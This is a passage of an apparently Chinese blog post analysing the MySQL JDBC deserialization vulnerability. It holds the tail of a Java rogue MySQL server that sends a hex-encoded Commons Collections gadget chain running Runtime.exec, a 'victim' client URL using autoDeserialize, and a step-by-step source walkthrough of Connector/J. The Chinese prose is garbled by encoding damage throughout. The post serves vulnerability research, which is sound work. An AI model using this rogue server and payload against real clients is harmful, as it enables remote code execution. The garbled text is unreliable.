mysqlDatafinal.toString();</span><br><span class="line">                            sendData(clientSocket, mysqlstring);</span><br><span class="line">                            data = receiveData(clientSocket);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (data.contains(<span class="string">&quot;SHOW WARNINGS&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&quot;</span>;</span><br><span class="line">                            sendData(clientSocket, payload);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Receive data from client</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">receiveData</span><span class="params">(Socket socket)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> socket.getInputStream();</span><br><span class="line">        <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> inputStream.read(buffer);</span><br><span class="line">        <span class="type">String</span> <span class="variable">asciiString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Arrays.copyOf(buffer, bytesRead), StandardCharsets.US_ASCII);</span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span>  asciiString;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Receiving the package: &quot;</span> + data);</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send data to client</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sendData</span><span class="params">(Socket socket, String data)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Sending the package: &quot;</span> + data);</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        outputStream.write(hexToBytes(data));</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert byte array to hexadecimal string</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            hexString.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert hexadecimal string to byte array</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexToBytes(String hex) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> hex.length();</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">            bytes[i / <span class="number">2</span>] = (<span class="type">byte</span>) Integer.parseInt(hex.substring(i, i + <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get payload content from file</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getPayloadContent</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(PAYLOAD_FILE);</span><br><span class="line">        <span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">                fis.read(bytes);</span><br><span class="line">                <span class="keyword">return</span> bytesToHex(bytes);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Payload file not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•payloadï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”¨äºæµ‹è¯•çš„å—å®³JDBC Client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBC_Attack_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_Url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?&quot;</span>+</span><br><span class="line">                <span class="string">&quot;autoDeserialize=true&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        Class.forName(ClassName);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(JDBC_Url, username, password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JDBC_Mysql_Attack.gif" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JDBC_Mysql_Attack.gif" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="JDBC_Mysql_Attack"></p><p>ä¹Ÿå¯ä»¥å­¦ä¹ su18ä½¬ç”¨cobaråšæ¶æ„server</p><p><a href="https://paper.seebug.org/1832/">https://paper.seebug.org/1832/</a></p><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>è¿™ä¸ªè°ƒè¯•æœ‰ç‚¹å¤æ‚</p><p>å…ˆæ¥çœ‹çœ‹getConnection <code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>ä¼šå‘ç”Ÿäº›ä»€ä¹ˆ</p><p>autoDeserializeå‚æ•°æ˜¯æœ¬æ¼æ´çš„å…³é”®ï¼Œè¿™ä¸ªå‚æ•°ä¸ºtrueæ—¶ï¼ŒJDBCå®¢æˆ·ç«¯ä¼šè‡ªåŠ¨ååºåˆ—åŒ–æœåŠ¡ç«¯è¿”å›çš„æ•°æ®</p><p>åœ¨getConnectionå¤„æ‰“ä¸Šæ–­ç‚¹ï¼Œè·Ÿè¿›åˆ°NonRegisteringDriver.connectï¼Œå…ˆè°ƒç”¨äº†acceptsUrlå»æ£€æŸ¥urlï¼Œç„¶åè°ƒç”¨getConnectionUrlInstance</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127214810866.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127214810866.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127214810866"></p><p>è·Ÿè¿›accesptsUrlå‘ç°ï¼Œåªæ˜¯åˆ¤æ–­urléç©ºï¼Œå’Œschemaéƒ¨åˆ†è¦åŒ…å«å›ºå®šå­—ç¬¦ä¸²</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127214946775.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127214946775.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127214946775"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127215014212.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127215014212.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127215014212"></p><p>ç»§ç»­è·Ÿè¿›getConnectionUrlInstanceï¼Œå‰é¢çš„ä»£ç æ˜¯ä»cacheè¡¨é‡Œçœ‹æ˜¯å¦åŠ è½½è¿‡äº†ï¼Œç•¥è¿‡ï¼›ç›´æ¥çœ‹åˆ°parseConnectionStringè§£æJDBCä¸²</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127215924256.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127215924256.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127215924256"></p><p>è·Ÿè¿›åˆ°ConnectionUrlParser.parseConnectionStringï¼Œç”¨CONNECTION_STRING_PTRN matcherå»è§£ææ­£åˆ™åŒ¹é…JDBCä¸²</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127220634371.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127220634371.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127220634371"></p><p>æ­£åˆ™å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">CONNECTION_STRING_PTRN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;(?&lt;scheme&gt;[\\w:%]+)\\s*(?://(?&lt;authority&gt;[^/?#]*))?\\s*(?:/(?!\\s*/)(?&lt;path&gt;[^?#]*))?(?:\\?(?!\\s*\\?)(?&lt;query&gt;[^#]*))?(?:\\s*#(?&lt;fragment&gt;.*))?&quot;</span>);</span><br></pre></td></tr></table></figure><p>æœ€ååˆ†å‰²çš„å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221115430.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221115430.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127221115430"></p><p>å› ä¸ºschemaä¸º<code>jdbc:mysql</code>ï¼Œç†æ‰€å½“ç„¶çš„èµ°åˆ°äº†case SIGLE_CONMNECTIONï¼Œå®ä¾‹åŒ–äº†<code>com.mysql.cj.conf.url.SingleConnectionUrl</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221333134.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221333134.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127221333134"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221410824.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221410824.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127221410824"></p><p>ç»§ç»­å›åˆ°NonRegisteringDriver.connectï¼Œè°ƒç”¨ConnectionImpl.getInstance</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221634625.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127221634625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127221634625"></p><p>è·Ÿè¿›åˆ°createNewIO -&gt; ConnectOneTryOnly -&gt; initializePropsFromServer -&gt; handleAutoCommitDefaults -&gt; setAutoCommitï¼Œè°ƒç”¨execSQL</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127223104495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127223104495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127223104495"></p><p>æ¥ç€è°ƒç”¨sendQueryString</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127223228191.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241127223228191.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241127223228191"></p><p>ç¬¬ä¸€æ¬¡å‘é€äº†<code>SET autocommit=1</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128105736061.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128105736061.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128105736061"></p><p>è·Ÿè¿›åˆ°queryPacketä¸º<code>SET autocommit=1</code>çš„sendQueryPacketå†…</p><p>è°ƒç”¨äº†invokeQueryInterceptorsPreï¼Œè¿™é‡Œçš„interceptorsæ˜¯NoSubInterceptorWrapperåŒ…è£…çš„ServerStatusDiffInterceptor</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128110351849.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128110351849.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128110351849"></p><p>è€Œä¸”æ˜¯åœ¨å‘é€<code>SET autocommit=1</code>Packetä¹‹å‰è°ƒç”¨çš„invokeQueryInterceptorsPre</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111810314.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111810314.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128111810314"></p><p>è·Ÿè¿›åˆ°ä¸‰ä¸ªå½¢å‚invokeQueryInterceptorsPreï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå…³é”®çš„å‡½æ•°ã€‚å¾ªç¯è°ƒç”¨äº†interceptorsçš„preProcessæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128110558859.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128110558859.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128110558859"></p><p>è¿™å°±æ˜¯åœ¨å®˜ç½‘æ‰‹å†Œæ‰€è¯´çš„ï¼Œå®ç°äº†<code>com.mysql.cj.interceptors.QueryInterceptor</code>æ¥å£çš„ç±»ï¼Œä¼šè°ƒç”¨é‡å†™çš„proProcessæ–¹æ³•æ¥å¤„ç†SQLæŸ¥è¯¢å’Œå¤„ç†SQLç»“æœ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111254101.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111254101.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128111254101"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111323309.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111323309.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128111323309"></p><p>è·Ÿè¿›åˆ°ServerStatusDiffInterceptorï¼Œè°ƒç”¨äº†populateMapWithSessionStatusValues</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111424409.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128111424409.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128111424409"></p><p>è¯¥å‡½æ•°å†…ï¼Œä¼šå…ˆè°ƒç”¨<code>executeQuery(&quot;SHOW SESSION STATUS&quot;)</code>ï¼Œç„¶åè°ƒç”¨ResultSetUtil.resultSetToMap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128113417732.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128113417732.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128113417732"></p><p>åœ¨å‘é€SHOW SESSION STATUSä¹‹å‰å·²ç»å®Œæˆäº†æ¡æ‰‹å’Œé…ç½®è¿™äº›åŸºæœ¬çš„ç¯èŠ‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128114212993.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128114212993.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128114212993"></p><p>OKæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹<code>executeQuery(&quot;SHOW SESSION STATUS&quot;)</code>ï¼Œåˆè°ƒç”¨äº†<code>((NativeSession) locallyScopedConn.getSession()).execSQL</code>ï¼Œä»€ä¹ˆå¥—å¨ƒ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120028200.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120028200.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128120028200"></p><p>ç»§ç»­å¥—å¨ƒåˆ°invokeQueryInterceptorsPreï¼Œå› ä¸ºæœ¬åŒ…å·²ç»æ˜¯è¢«interceptoræ‹¦æˆªä¸‹æ¥ï¼Œåœ¨interceptor preProcesså‘çš„åŒ…ï¼Œæ‰€ä»¥é”éªŒè¯ä¸è¿‡ï¼Œä¸ä¼šå†æ¬¡è¿›å…¥preProcess</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120315036.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120315036.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128120315036"></p><p>ç»ˆäºè·Ÿåˆ°äº†å‘é€æ•°æ®åŒ…äº†ï¼sendCommandå‘é€<code>SHOW SESSION STATUS</code>æ•°æ®åŒ…</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120647998.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128120647998.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128120647998"></p><p>sendCommandä¹Ÿä¼šèµ°ä¸€éinvokeQueryInterceptorsPreï¼Œä¸è¿‡è¿™é‡Œæ˜¯ä¸¤ä¸ªå½¢å‚ï¼Œå¯¹åº”å‚æ•°çš„preProcessè¿”å›null</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128135857311.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128135857311.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128135857311"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128135905286.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128135905286.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128135905286"></p><p>æœ€ååœ¨sendCommandå‘é€äº†æ•°æ®åŒ…</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128140037272.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128140037272.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128140037272"></p><p>å¯¹åº”Serveræ¥æ”¶åˆ°äº†SHOW SESSION STATUS</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128140050546.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128140050546.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128140050546"></p><p>åœ¨sendCommandä¹‹åï¼Œä¼šè°ƒç”¨readAllResultsè¯»å–ç»“æœ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142216373.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142216373.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128142216373"></p><p>æŒ‰ç…§scanForAndThrowDataTruncation -&gt; convertShowWarningsToSQLWarningsçš„é“¾å­ï¼Œè·Ÿåˆ°äº†å‘é€SHOW WARNINGSçš„ä»£ç </p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142818395.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142818395.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128142818395"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142902254.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128142902254.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128142902254"></p><p>å¦‚æœä¸å›å¤è¿™ä¸ªSHOW WARNINGSï¼Œä¼šæœ‰è§£æé—®é¢˜</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143052796.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143052796.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128143052796"></p><p>ä¹Ÿå°±æ˜¯è¯´Clientå‘é€SHOW SESSION STATUSï¼Œæ¥æ”¶åˆ°æ•°æ®åŒ…åClientè¿˜å‘é€äº†SHOW WARNINGSï¼Œå¹¶éœ€è¦æ¥æ”¶åˆ°æ­£ç¡®çš„å›ç­”</p><p>æ¥ç€çœ‹æ€ä¹ˆå¤„ç†çš„SHOW SESSION STATUSçš„å›ç­”ï¼Œè·Ÿè¿›åˆ°resultSetToMap</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143151377.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143151377.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128143151377"></p><p>å¾ªç¯è°ƒç”¨äº†rs.getObjectè¯»å–æ•°æ®</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143417526.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143417526.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128143417526"></p><p>è·Ÿè¿›åˆ°getObject(2)ï¼Œè¿›å…¥case BLOBï¼Œå¯¹æ¥æ”¶çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ï¼Œè‡³æ­¤ååºåˆ—åŒ–æ¼æ´è§¦å‘</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143524214.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143524214.png" 